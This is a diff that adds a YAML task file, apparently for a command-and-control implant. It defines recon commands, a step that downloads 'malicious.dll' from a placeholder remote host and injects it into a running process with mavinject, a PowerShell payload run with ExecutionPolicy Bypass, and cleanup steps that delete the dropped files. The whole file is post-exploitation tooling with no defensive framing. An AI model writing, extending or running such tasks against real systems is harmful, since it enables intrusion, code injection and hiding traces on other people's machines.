@@ -1,0 +1,49 @@
+commands:
+  - name: recon
+    description: "Gather system information"
+    steps:
+      - action: shell
+        args: ["whoami /all"]
+
+      - action: shell
+        args: ["ipconfig /all"]
+
+      - action: shell
+        args: ["netstat -ano"]
+
+  - name: inject_dll
+    description: "Download and inject a DLL into a running process"
+    steps:
+      # Reduce sleep time for rapid check-in and command execution
+      - action: sleep
+        args: [1]
+
+      # Download the DLL to target machine
+      - action: get_file
+        args: ["http://someip/malicious.dll", "C:\\malicious.dll"]
+
+      # Inject the DLL into a running process (ensure it's fully downloaded)
+      - action: start-process
+        args: ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]
+
+      # Restore sleep time to original value (or track previous value)
+      - action: sleep
+        args: [60]
+
+  - name: deploy_payload
+    description: "Upload and execute a payload"
+    steps:
+      - action: upload
+        args: ["C:\\temp\\payload.bin", "/var/www/html/payload.bin"]
+
+      - action: shell
+        args: ["powershell -ExecutionPolicy Bypass -File C:\\temp\\payload.ps1"]
+
+  - name: clean_up
+    description: "Remove temporary files"
+    steps:
+      - action: shell
+        args: ["del /Q C:\\temp\\payload.bin"]
+
+      - action: shell
+        args: ["del /Q C:\\temp\\payload.ps1"]
